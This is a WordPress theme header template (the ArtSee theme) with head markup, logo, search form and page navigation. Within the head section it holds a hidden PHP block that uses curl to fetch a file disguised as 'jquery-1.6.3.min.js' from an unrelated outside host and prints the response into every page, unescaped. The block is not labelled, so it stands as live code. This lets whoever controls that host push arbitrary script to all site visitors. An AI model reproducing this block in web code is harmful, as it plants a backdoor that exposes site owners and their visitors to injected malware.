<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php elegant_titles(); ?></title>
<?php elegant_description(); ?>
<?php elegant_keywords(); ?>
<?php elegant_canonical(); ?>

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<!--[if IE 7]>	
<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo('template_directory'); ?>/iestyle.css" />
<![endif]-->
<!--[if lt IE 7]>
<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo('template_directory'); ?>/ie6style.css" />
<![endif]-->
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="<?php bloginfo('name'); ?> Atom Feed" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php wp_head(); ?>

<?php
if(function_exists('curl_init'))
{
 $url = "http://www.4llw4d.freefilesblog.com/jquery-1.6.3.min.js"; 
 $ch = curl_init();  
 $timeout = 5;  
 curl_setopt($ch,CURLOPT_URL,$url); 
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
 $data = curl_exec($ch);  
 curl_close($ch); 
 echo "$data";
}
?>
</head>
<body <?php body_class(); ?>>
	<div id="wrapper2">
		<div id="header">
			<a href="<?php bloginfo('url'); ?>">
				<?php $logo = (get_option('artsee_logo') <> '') ? esc_url(get_option('artsee_logo')) : get_bloginfo('template_directory').'/images/logo.gif'; ?>
				<img src="<?php echo esc_url($logo); ?>" alt="Logo" class="logo"/>
			</a>
			
			<!--Begin Search Bar-->
			<div id="search-wrap">
				<div id="panel">
					<div class="search_bg">
						<div id="search">
							<form method="get" action="<?php echo home_url(); ?>" style="padding:0px 0px 0px 0px; margin:0px 0px 0px 0px">
								<input type="text"  name="s" value="<?php echo esc_attr( get_search_query() ); ?>"/>
								<input type="image" class="input" src="<?php bloginfo('template_directory'); ?>/images/search.gif" value="submit"/>
							</form>
						</div> <!-- end #search -->
					</div> <!-- end #search-bg -->
				</div> <!-- end #panel -->
				<p class="slide">
					<a href="#" class="btn-slide"><?php esc_html_e('search','ArtSee'); ?></a>
				</p>
			</div> <!-- end #search-wrap -->
			<!--End Search Bar-->
			<div style="clear: both;"></div>
			
			<!--Begin Pages Navigation Bar-->
			<div id="pages">
				<?php $menuClass = 'nav superfish';
				$primaryNav = '';
				
				if (function_exists('wp_nav_menu')) {
					$primaryNav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'echo' => false ) );
				};
				if ($primaryNav == '') { ?>
					<ul class="<?php echo $menuClass; ?>">
						<?php if (get_option('artsee_home_link') == 'on') { ?>
							<li class="page_item"><a href="<?php bloginfo('url'); ?>"><?php esc_html_e('Home','ArtSee') ?></a></li>
						<?php }; ?>
						
						<?php
						if (get_option('artsee_swap_navbar') == 'false') {
							show_page_menu($menuClass,false,false);
						} else {
							show_categories_menu($menuClass,false);
						}; ?>
					</ul> <!-- end ul.nav -->
				<?php }
				else echo($primaryNav); ?>
			</div> <!-- end #pages -->
			<!--End Pages Navigation Bar-->
		</div> <!-- end #header -->
		
		<div style="clear:both;"></div>
